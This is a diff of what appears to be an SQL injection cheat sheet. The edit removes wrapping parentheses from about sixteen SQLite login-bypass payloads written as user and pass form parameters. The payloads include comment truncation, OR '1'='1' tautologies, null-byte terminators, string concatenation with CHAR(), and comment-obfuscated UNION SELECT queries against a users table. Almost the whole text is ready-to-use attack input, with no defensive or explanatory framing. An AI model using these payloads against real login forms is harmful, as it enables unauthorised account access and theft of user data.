@@ -13,37 +13,37 @@ We can use the following code to make it true
 ..............................................................................
 # For SQLi (SQLite)
 
-( user=admin' ;&pass=a )
+user=admin' ;&pass=a 
 
-( user=admin' --&pass=a )
+user=admin' --&pass=a
 
-( user=admin' /*&pass=a )
+user=admin' /*&pass=a
 
-( adm'||'in &Pass=' glob '* )
+adm'||'in &Pass=' glob '*
 
-( user=ad'||'min'%00&pass=a )
+user=ad'||'min'%00&pass=a
 
-( user=1' OR '1'='1%00&pass=a )
+user=1' OR '1'='1%00&pass=a
 
-( user=admin' OR '1'='1';&pass=a )
+user=admin' OR '1'='1';&pass=a
 
-( user=admin' OR '1'='1'--&pass=a )
+user=admin' OR '1'='1'--&pass=a
 
-( user=admin' OR '1'='1'/*&pass=a )
+user=admin' OR '1'='1'/*&pass=a
 
-( user=admin&pass=a'/**/IS/**/NOT/**/'b )
+user=admin&pass=a'/**/IS/**/NOT/**/'b
 
-( user='admi'||CHAR(' AND pass='-0+110)||'' )
+user='admi'||CHAR(' AND pass='-0+110)||''
 
-( user=adm' ||   trim('in', Password: )  || '&pass=a )
+user=adm' ||   trim('in', Password: )  || '&pass=a
 
-( user=admin' union select * from users where '1&pass=a )
+user=admin' union select * from users where '1&pass=a
 
-( user=' union select * from users where username in("admin")/*&pass=a )
+user=' union select * from users where username in("admin")/*&pass=a
 
-(  user=mali'/**/union/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;&pass=a )
+user=mali'/**/union/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;&pass=a
 
-( User='/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*&pass=a )
+User='/**/union/**/select*from/**/users/**/where/**/username/**/in(char(97,100,109,105,110))/*&pass=a
 
 .....................................................................................
 # For SQLi (SQLite)
